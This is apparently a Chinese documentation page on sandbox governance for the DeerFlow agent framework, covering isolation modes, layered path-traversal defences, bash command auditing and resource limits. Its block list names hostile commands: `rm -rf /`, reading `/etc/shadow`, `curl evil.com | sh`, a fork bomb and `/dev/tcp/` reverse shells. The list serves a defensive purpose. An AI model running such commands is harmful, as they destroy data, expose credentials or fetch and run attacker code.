---
title: "沙箱治理"
description: "Agent 执行 bash 命令、读写文件时，能碰到什么？不能碰到什么？这是 IT 管理者最关心的问题——"一段 prompt 能不能搞出 `rm -rf /`？""
topics: [governance, compliance, audit]
---

# 沙箱治理

Agent 执行 bash 命令、读写文件时，能碰到什么？不能碰到什么？这是 IT 管理者最关心的问题——"一段 prompt 能不能搞出 `rm -rf /`？"

> **交叉引用：** 五种沙箱的隔离级别 + 提权/网络/seccomp 对比见 [security/02-sandbox-isolation.md](../security/02-sandbox-isolation.md)。

## 五种沙箱模式

| 模式 | `sandbox.use` | 隔离级别 | 适用场景 |
|------|--------------|---------|---------|
| **Local** | `deerflow.sandbox.local:LocalSandboxProvider` | 无进程隔离，共享 host 内核 | 个人开发、信任环境 |
| **Docker (AioSandbox)** | `deerflow.community.aio_sandbox:AioSandboxProvider` | 容器隔离 | 团队部署 |
| **K3s (Provisioner)** | `deerflow.sandbox.provisioner:ProvisionerSandboxProvider` | Pod 隔离 | 多租户、高安全需求 |

**Local 模式的特殊风险：** agent 的 bash 命令直接在 host 上执行。所有隔离依赖虚拟路径翻译——如果路径翻译有 bug，agent 就能碰到系统文件。

## 6 层路径防穿透

DeerFlow 不是靠一层防护来防路径穿越——它是 6 层叠加的纵深防御：

| 层 | 位置 | 机制 |
|----|------|------|
| **1. 虚拟路径体系** | `LocalSandboxProvider` → `PathMapping` | agent 只看到 `/mnt/user-data/{workspace,uploads,outputs}`，物理路径在 `users/{user_id}/threads/{thread_id}/` 下 |
| **2. 工具层路径翻译** | `sandbox/tools.py` → `replace_virtual_path()` | 每个 tool（bash, read_file, write_file, ls, str_replace）都调用路径翻译，把虚拟路径转成 host 路径 |
| **3. `allow_host_bash` 开关** | `sandbox/security.py` → `is_host_bash_allowed()` | Local 模式下默认**禁止**直接 host bash——强制启用时必须显式配置 |
| **4. CWD 注入** | `tools.py` bash handler | 每个 bash 命令前自动注入 `cd /mnt/user-data/workspace &&`，把命令限定在 workspace |
| **5. 路径参数校验** | 各 tool 实现 | 拒绝 `..` 穿越、绝对系统路径（`/etc/passwd`）、符号链接逃逸 |
| **6. 输出路径脱敏** | `tools.py` → `mask_local_paths_in_output()` | 即使 host 路径意外出现在输出中，也会被正则替换回虚拟路径 |

### Bash 子命令审计

SandboxAuditMiddleware 把 bash 命令按 `&&`/`||`/`;` 切分成子命令，逐条正则匹配。防止用 `ls /safe/path && rm -rf /` 这种拼接绕过检测。

### 高危命令示例（会 block）

- `rm -rf /` 及其变体（`rm -rf --no-preserve-root /`）
- `dd if=` 磁盘覆写
- `cat /etc/shadow` 读取密码文件
- 重定向到 `/etc/`（`echo ... > /etc/cron.d/...`）
- pipe 到 `sh`/`bash`（`curl evil.com | sh`）
- `base64 -d |` 管道（解码后执行）
- 覆盖 `/usr/bin/`、`/bin/`、`/sbin/`
- fork bomb（`:(){ :|:& };:`）
- `LD_PRELOAD`/`LD_LIBRARY_PATH` 注入
- `/dev/tcp/` 反向 shell

### 中危命令（会 warn，不拦截）

- `chmod 777`
- `pip install` / `apt-get install`
- `sudo` / `su`
- `PATH=` 环境变量修改

## 资源管控

| 资源 | 限制 | 位置 |
|------|------|------|
| **Sandbox 实例数** | Local: LRU cache 256 个 per-thread sandbox | `sandbox/local/` |
| **bash 输出** | middle truncation 20,000 字符 | `tools.py` |
| **read_file 输出** | head 50,000 字符 | `tools.py` |
| **ls 输出** | head 20,000 字符 | `tools.py` |
| **命令长度** | 拒绝 >10,000 字符的 bash 命令 | `sandbox_audit_middleware.py` |
| **null byte** | 拒绝含 null byte 的命令 | `sandbox_audit_middleware.py` |

## Per-Thread 隔离

每个 thread 有自己的 sandbox 实例。在 Local 模式下：

```
thread_1 → sandbox_id="local:thread_1" → workspace at users/alice/threads/t1/workspace
thread_2 → sandbox_id="local:thread_2" → workspace at users/alice/threads/t2/workspace
```

两个 thread 之间无法通过 sandbox 读写对方的文件。文件操作锁 `(sandbox_id, path)` 粒度确保同一 sandbox 内并发写同一文件时有互斥。

## 还要担心什么

| 风险 | 现状 | 建议 |
|------|------|------|
| **Local 模式 host bash** | `allow_host_bash` 默认关，但可以被配置打开 | 生产环境必须用 Docker 或 K3s |
| **Container escape** | Docker/K3s 依赖 container runtime 安全 | 保持 Docker/K3s 版本更新，关注 CVE |
| **Resource exhaustion** | 无 CPU/内存限制 | 在 Docker/K3s 层配 cgroup limit |
| **网络访问** | Agent 可以通过 curl/wget 访问外网 | 评估是否需要网络隔离（sandbox network policy） |
| **Skills 注入** | 恶意 skill 可被 agent 加载 | Skills security scanner（LLM 扫描 + 人工审核） |

## 设计决策分析

### 为什么是 6 层路径防穿透，而不是 1 层？

单一防护层（比如只做 `path.relative_to` 检查）的致命缺陷：一个 bug 全线崩溃。6 层设计的原则是**每层假设前面的层已经被绕过**：

1. 虚拟路径体系假设 tool 层翻译出了 bug → 限制 blast radius
2. Tool 层翻译假设沙箱层出了问题 → 独立校验
3. `allow_host_bash` 假设前面全失效了 → 最粗粒度的 kill switch
4. CWD 注入假设命令构造有 bug → 即使路径检查漏了，命令也被限定在 workspace
5. 路径参数校验假设 CWD 没生效 → 最后一层参数级过滤
6. 输出脱敏假设一切正常但 host 路径意外泄露 → 信息泄露的最后防线

这种设计不是 academic exercise——Local 模式下没有内核级隔离，路径翻译是唯一的屏障。6 层叠加把"翻译器 bug → agent 读 /etc/passwd"的概率压到极低。

### 为什么 per-thread 而不是 per-user 沙箱实例？

Per-user 共享沙箱的风险是 thread 间文件污染：thread A 创建的文件可能被 thread B 覆盖/删除/读取。Per-thread 隔离避免了并发文件操作冲突，也简化了审计——每个 thread 的操作限定在自己的 workspace。

代价是资源开销更大（N 个 thread = N 个 sandbox 实例）。Local 模式用 LRU cache（上限 256）管理 per-thread 实例，超过上限时淘汰最久未用的。

### 为什么 SandboxAudit 的高危模式是硬编码的？

不可配置的高危命令列表看似僵化，但在 Agent 安全场景中是正确的权衡：
- **审计可证明性**：审查者可以精确知道什么会被拦截，不需要审计生产配置
- **配置错误免疫**：`denied_commands: ["rm"]` 写错成 `denied_commands: ["rm "]` 不会导致保护失效
- **LLM 不可预测性**：Agent 的行为不是预定义的，不能依赖"用户不会让 agent 执行危险命令"的假设

对于需要自定义高危列表的场景，建议在 Guardrail provider 层实现参数级检测——provider 能拿到 `tool_input`，可以做比 regex 更精细的判断。

### 与行业沙箱方案的对比

| 方案 | 隔离机制 | 启动延迟 | 资源开销 | DeerFlow 对应 |
|------|---------|---------|---------|-------------|
| **Local subprocess** | 无（共享内核） | 0ms | 极低 | Local 模式 |
| **Docker container** | 内核 namespace + cgroup | 1-3s | 中等 | AioSandbox |
| **K8s Pod** | Pod namespace + NetworkPolicy | 5-30s | 较高 | K3s Provisioner |
| **gVisor (Google)** | 用户态内核（sentry） | <100ms | 中等 | 未支持 |
| **Firecracker (AWS)** | microVM (KVM) | 125ms | 低 | 未支持 |
| **WebAssembly** | Wasm sandbox (capability-based) | ~0ms | 极低 | 未支持 |

DeerFlow 的三层沙箱覆盖了主流场景，但缺少 microVM 和 Wasm 这两个新兴方向。microVM（Firecracker）提供了比容器更强的隔离（独立 guest kernel），启动速度接近容器；Wasm 提供了 capability-based 的细粒度权限控制。如果你的安全需求超过 Docker 但没到需要 K3s 的程度，可以考虑在 Docker 层配置 AppArmor/SELinux profile 来补偿。

### Docker 模式的安全注意

Docker 模式下 DeerFlow **显式设置 `seccomp=unconfined`**（`aio_sandbox.py`），这意味着内核允许容器内的进程调用 ~300+ 系统调用（默认 Docker seccomp profile 会阻止 ~44 个高风险 syscall）。这个设计的初衷是避免工具兼容性问题（某些 CLI 工具需要 `ptrace`、`mount` 等受限 syscall），但代价是增加了容器逃逸面。

生产部署建议：如果不需要全量 syscall，在 Docker daemon 层面重新启用默认 seccomp profile，或者编写自定义 profile 只放行需要的 syscall。
